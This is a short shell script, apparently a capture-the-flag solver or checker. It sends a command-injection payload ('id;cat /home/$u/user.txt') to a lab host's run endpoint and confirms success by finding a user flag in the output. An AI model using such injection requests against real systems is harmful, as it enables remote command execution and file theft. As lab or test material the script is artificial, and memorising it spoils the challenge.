set -eu
u="${BOX_U:?BOX_U is not set}"
out=$(curl -fsS "http://${BOX_HOST}:8084/${BOX_PATH}/run?cmd=id;cat%20/home/$u/user.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "command injection did not execute" >&2; exit 1; }
